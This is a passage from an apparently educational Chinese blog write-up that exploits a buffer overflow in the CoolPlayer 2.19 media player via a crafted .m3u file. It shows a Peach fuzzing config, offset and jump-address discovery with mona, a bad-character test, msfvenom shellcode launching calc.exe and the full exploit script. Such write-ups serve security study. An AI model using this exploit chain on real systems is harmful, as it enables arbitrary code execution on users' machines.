<span class="tag">&lt;/<span class="name">State</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;/<span class="name">StateModel</span>&gt;</span> </span><br><span class="line">  </span><br><span class="line"> <span class="comment">&lt;!-- Setup a local agent that will monitor for faults --&gt;</span> </span><br><span class="line"> <span class="tag">&lt;<span class="name">Agent</span> <span class="attr">name</span>=<span class="string">"LocalAgent"</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">Monitor</span> <span class="attr">class</span>=<span class="string">"WindowsDebugger"</span>&gt;</span> </span><br><span class="line">    </span><br><span class="line">   <span class="comment">&lt;!-- The command line to run.  Notice the filename provided matched up  </span></span><br><span class="line"><span class="comment">    to what is provided below in the Publisher configuration --&gt;</span> </span><br><span class="line">   <span class="tag">&lt;<span class="name">Param</span> <span class="attr">name</span>=<span class="string">"CommandLine"</span> </span></span><br><span class="line"><span class="tag"><span class="attr">value</span>=<span class="string">"C:\Users\kuang'j\Desktop\cve\CoolPlayer219\CoolPlayer219\coolplayer.exe  </span></span></span><br><span class="line"><span class="string"><span class="tag">C:\Users\kuang'j\Desktop\cve\peach-3.1.124-win-x86-debug\peach-3.1.124-win-x86-debug\fuzzed.m3u"</span>  /&gt;</span> </span><br><span class="line">    </span><br><span class="line">   <span class="comment">&lt;!-- This parameter will cause the debugger to wait for an action-call </span></span><br><span class="line"><span class="comment">in </span></span><br><span class="line"><span class="comment">    the state model with a method="ScoobySnacks" before running </span></span><br><span class="line"><span class="comment">    program. </span></span><br><span class="line"><span class="comment">     </span></span><br><span class="line"><span class="comment">    <span class="doctag">Note:</span> You will also need to add a parameter to the publisher called </span></span><br><span class="line"><span class="comment">        "debugger" and set it to "true"! </span></span><br><span class="line"><span class="comment">    --&gt;</span> </span><br><span class="line">   <span class="tag">&lt;<span class="name">Param</span> <span class="attr">name</span>=<span class="string">"StartOnCall"</span> <span class="attr">value</span>=<span class="string">"coolplayer"</span> /&gt;</span> </span><br><span class="line">    </span><br><span class="line">  <span class="tag">&lt;/<span class="name">Monitor</span>&gt;</span> </span><br><span class="line">   </span><br><span class="line">  <span class="comment">&lt;!-- Enable heap debugging on our process as well. --&gt;</span> </span><br><span class="line">   <span class="tag">&lt;<span class="name">Monitor</span> <span class="attr">class</span>=<span class="string">"PageHeap"</span>&gt;</span> </span><br><span class="line">   <span class="tag">&lt;<span class="name">Param</span> <span class="attr">name</span>=<span class="string">"Executable"</span> <span class="attr">value</span>=<span class="string">"coolplayer.exe"</span>/&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">Monitor</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;/<span class="name">Agent</span>&gt;</span> </span><br><span class="line">  </span><br><span class="line"> <span class="tag">&lt;<span class="name">Test</span> <span class="attr">name</span>=<span class="string">"Default"</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">Agent</span> <span class="attr">ref</span>=<span class="string">"LocalAgent"</span> /&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">StateModel</span> <span class="attr">ref</span>=<span class="string">"State"</span>/&gt;</span> </span><br><span class="line">   </span><br><span class="line">  <span class="comment">&lt;!-- Configure our publisher with correct filename to write too --&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">Publisher</span> <span class="attr">class</span>=<span class="string">"File"</span>&gt;</span> </span><br><span class="line">   <span class="tag">&lt;<span class="name">Param</span> <span class="attr">name</span>=<span class="string">"FileName"</span> <span class="attr">value</span>=<span class="string">"fuzzed.m3u"</span> /&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">Publisher</span>&gt;</span> </span><br><span class="line"> </span><br><span class="line">  <span class="tag">&lt;<span class="name">Strategy</span> <span class="attr">class</span>=<span class="string">"Sequential"</span>&gt;</span><span class="tag">&lt;/<span class="name">Strategy</span>&gt;</span> </span><br><span class="line"> </span><br><span class="line">  <span class="comment">&lt;!-- Configure a logger to store collected information --&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">Logger</span> <span class="attr">class</span>=<span class="string">"File"</span>&gt;</span> </span><br><span class="line">   <span class="tag">&lt;<span class="name">Param</span> <span class="attr">name</span>=<span class="string">"Path"</span> </span></span><br><span class="line"><span class="tag"><span class="attr">value</span>=<span class="string">"C:\Users\kuang'j\Desktop\cve\CoolPlayer219\CoolPlayer219\coolplayer.log"</span> /&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">Logger</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">Test</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">Peach</span>&gt;</span> </span><br><span class="line"><span class="comment">&lt;!-- end --&gt;</span> </span><br></pre></td></tr></tbody></table></figure>
<p>然后用 <code>PeachValidator</code>  加载  <code>M3UFuzzer.xml</code> ，验证配置文件的正确性</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241228152826553.png" alt="image-20241228152826553"></p>
<p>看到加载后显示 <code>filename</code>  的数据是 AAA，验证成功</p>
<h3 id="触发漏洞-6"><a class="markdownIt-Anchor" href="#触发漏洞-6">#</a> 触发漏洞</h3>
<p>接下来开始 fuzz</p>
<p>配置如下</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241228153924882.png" alt="image-20241228153924882"></p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241228153950018.png" alt="image-20241228153950018"></p>
<p>然后开始 fuzz 模糊测试</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241228154452561.png" alt="image-20241228154452561"></p>
<p>最后发现在 3000 个 A 时触发异常， <code>EIP=41414141</code>  由此可以判断是存在可利用漏洞的</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">filename = <span class="string">"poc.m3u"</span> </span><br><span class="line">evilString = <span class="string">"A"</span> * <span class="number">3000</span> </span><br><span class="line">file = <span class="built_in">open</span>(filename,<span class="string">'w'</span>)  </span><br><span class="line">file.write(evilString)  </span><br><span class="line">file.close()</span><br></pre></td></tr></tbody></table></figure>
<p>编写如上 <code>poc.py</code>  脚本生成触发漏洞的 <code>poc.m3u</code>  文件，用 <code>coolplayer</code>  打开</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241228154834655.png" alt="image-20241228154834655"></p>
<p>可以看到成功触发了异常并且此时 <code>EIP=41414141</code></p>
<h3 id="定位偏移-4"><a class="markdownIt-Anchor" href="#定位偏移-4">#</a> 定位偏移</h3>
<p>一样利用 mona 工具</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona pc 3000</span><br></pre></td></tr></tbody></table></figure>
<p>生成 3000 长度的唯一字符串</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241228155134289.png" alt="image-20241228155134289"></p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evilString=<span class="string">"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9"</span></span><br></pre></td></tr></tbody></table></figure>
<p>赋值给 <code>evilstring</code>  然后生成新的 m3u 文件再次用 <code>coolplayer</code>  加载触发异常</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona findmsp</span><br></pre></td></tr></tbody></table></figure>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241228160323371.png" alt="image-20241228160323371"></p>
<p>发现此时 offset=203</p>
<p>那么就可以修改 poc 如下来验证这个便宜是否正确</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evilString = <span class="string">"A"</span>*<span class="number">203</span> +<span class="string">"BBBB"</span> +<span class="string">"C"</span>*(<span class="number">3000</span>-<span class="number">203</span>-<span class="number">4</span>)</span><br></pre></td></tr></tbody></table></figure>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241228160510022.png" alt="image-20241228160510022"></p>
<p>加载生成新的 m3u 文件，触发异常，发现 <code>EIP=42424242</code>  精准溢出，说明偏移没有问题</p>
<p>分析当前各个寄存器，发现 ESP 和 EBX 指向地方为 41414141，但是在 ESP 中被截断，可利用空间有限；在 EBX 中正常，且可利用空间足够大，  因此考虑后续利用 EBX，对 EBX 进行缓冲区溢出利用。</p>
<h3 id="寻找跳转指令-4"><a class="markdownIt-Anchor" href="#寻找跳转指令-4">#</a> 寻找跳转指令</h3>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona jmp -r ebx</span><br></pre></td></tr></tbody></table></figure>
<p>发现所有可用的结果地址都是以 00 开头的，考虑是否 00 也可以呢，因为是不对 ESP 使用，是对 EBX 指向的内存空间的应用。</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241229005248758.png" alt="image-20241229005248758"></p>
<p>取其中一个地址</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241229005324346.png" alt="image-20241229005324346"></p>
<p>修改 poc 如下</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evilString = <span class="string">b"\x90"</span> * <span class="number">10</span> + <span class="string">b"A"</span> * (<span class="number">203</span>-<span class="number">10</span>) + <span class="string">b"\xde\x21\x41\x00"</span> + <span class="string">b"C"</span> *(<span class="number">3000</span>-<span class="number">203</span>-<span class="number">4</span>)</span><br></pre></td></tr></tbody></table></figure>
<p>生成新的 m3u 文件，再次加载 <code>004121de</code>  处下断点，然后发现程序果然断在了 <code>004121de</code> ，再 f7 发现成功跳转到 90 字节处</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241229011329954.png" alt="image-20241229011329954"></p>
<h3 id="坏字节分析-6"><a class="markdownIt-Anchor" href="#坏字节分析-6">#</a> 坏字节分析</h3>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona ba</span><br></pre></td></tr></tbody></table></figure>
<p>生成坏字节字符串</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">badchar = <span class="string">b""</span></span><br><span class="line">badchar += <span class="string">b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"</span></span><br><span class="line">badchar += <span class="string">b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"</span></span><br><span class="line">badchar += <span class="string">b"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"</span></span><br><span class="line">badchar += <span class="string">b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"</span></span><br><span class="line">badchar += <span class="string">b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"</span></span><br><span class="line">badchar += <span class="string">b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"</span></span><br><span class="line">badchar += <span class="string">b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"</span></span><br><span class="line">badchar += <span class="string">b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>再修改 poc 如下</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evilString = <span class="string">b"\x90"</span> * <span class="number">10</span> + <span class="string">b"A"</span> * (<span class="number">203</span>-<span class="number">10</span>) + <span class="string">b"\xde\x21\x41\x00"</span> + badchar +<span class="string">b"C"</span> *(<span class="number">3000</span>-<span class="number">203</span>-<span class="number">4</span>-<span class="built_in">len</span>(badchar)) </span><br></pre></td></tr></tbody></table></figure>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241229013754528.png" alt="image-20241229013754528"></p>
<p>发现没有坏字节</p>
<h3 id="编写shellcode-8"><a class="markdownIt-Anchor" href="#编写shellcode-8">#</a> 编写 shellcode</h3>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/exec cmd=calc.exe -f python -b "\x00"</span><br></pre></td></tr></tbody></table></figure>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">buf =  <span class="string">b""</span></span><br><span class="line">buf += <span class="string">b"\xdb\xc0\xbf\x2d\x52\xb8\xaa\xd9\x74\x24\xf4\x5d"</span></span><br><span class="line">buf += <span class="string">b"\x31\xc9\xb1\x31\x31\x7d\x18\x83\xc5\x04\x03\x7d"</span></span><br><span class="line">buf += <span class="string">b"\x39\xb0\x4d\x56\xa9\xb6\xae\xa7\x29\xd7\x27\x42"</span></span><br><span class="line">buf += <span class="string">b"\x18\xd7\x5c\x06\x0a\xe7\x17\x4a\xa6\x8c\x7a\x7f"</span></span><br><span class="line">buf += <span class="string">b"\x3d\xe0\x52\x70\xf6\x4f\x85\xbf\x07\xe3\xf5\xde"</span></span><br><span class="line">buf += <span class="string">b"\x8b\xfe\x29\x01\xb2\x30\x3c\x40\xf3\x2d\xcd\x10"</span></span><br><span class="line">buf += <span class="string">b"\xac\x3a\x60\x85\xd9\x77\xb9\x2e\x91\x96\xb9\xd3"</span></span><br><span class="line">buf += <span class="string">b"\x61\x98\xe8\x45\xfa\xc3\x2a\x67\x2f\x78\x63\x7f"</span></span><br><span class="line">buf += <span class="string">b"\x2c\x45\x3d\xf4\x86\x31\xbc\xdc\xd7\xba\x13\x21"</span></span><br><span class="line">buf += <span class="string">b"\xd8\x48\x6d\x65\xde\xb2\x18\x9f\x1d\x4e\x1b\x64"</span></span><br><span class="line">buf += <span class="string">b"\x5c\x94\xae\x7f\xc6\x5f\x08\xa4\xf7\x8c\xcf\x2f"</span></span><br><span class="line">buf += <span class="string">b"\xfb\x79\x9b\x68\x1f\x7f\x48\x03\x1b\xf4\x6f\xc4"</span></span><br><span class="line">buf += <span class="string">b"\xaa\x4e\x54\xc0\xf7\x15\xf5\x51\x5d\xfb\x0a\x81"</span></span><br><span class="line">buf += <span class="string">b"\x3e\xa4\xae\xc9\xd2\xb1\xc2\x93\xb8\x44\x50\xae"</span></span><br><span class="line">buf += <span class="string">b"\x8e\x47\x6a\xb1\xbe\x2f\x5b\x3a\x51\x37\x64\xe9"</span></span><br><span class="line">buf += <span class="string">b"\x16\xc7\x2e\xb0\x3e\x40\xf7\x20\x03\x0d\x08\x9f"</span></span><br><span class="line">buf += <span class="string">b"\x47\x28\x8b\x2a\x37\xcf\x93\x5e\x32\x8b\x13\xb2"</span></span><br><span class="line">buf += <span class="string">b"\x4e\x84\xf1\xb4\xfd\xa5\xd3\xd6\x60\x36\xbf\x36"</span></span><br><span class="line">buf += <span class="string">b"\x07\xbe\x5a\x47"</span></span><br></pre></td></tr></tbody></table></figure>
<p>kali 生成 shellcode</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">stackpivot = <span class="string">b"\x8B\xc4\x53\x5c\x83\xc4\x40\x49\x51\x66\x81\xC1\x25\x01\x66\x51\x66\x81\xc1\x6A\xE8\x41\x66\x51"</span></span><br><span class="line"></span><br><span class="line">evilString =  <span class="string">b"\x90"</span>*<span class="number">10</span> + stackpivot</span><br><span class="line">evilString += <span class="string">b"\x90"</span> * (<span class="number">203</span> - <span class="built_in">len</span>(evilString)) </span><br><span class="line">evilString += <span class="string">b"\xde\x21\x41\x00"</span> </span><br><span class="line">evilString += <span class="string">b"\x90"</span> * <span class="number">200</span> </span><br><span class="line">evilString += <span class="string">b"\x50\x5c"</span>  </span><br><span class="line">evilString += <span class="string">b"\x90"</span> * <span class="number">8</span>  </span><br><span class="line">evilString += buf  </span><br><span class="line"></span><br><span class="line">evilString += <span class="string">b"\x90"</span> * (<span class="number">3000</span> - <span class="built_in">len</span>(evilString)) </span><br></pre></td></tr></tbody></table></figure>
<p>修改 poc 如上</p>
<p>然后再运行程序导入 m3u 文件运行查看运行情况</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/Users/1/Desktop/%E6%9C%9F%E6%9C%AB%E6%9C%88/%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/%E6%96%87%E6%A1%A3/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20241231165352748.png" alt="image-20241231165352748"></p>
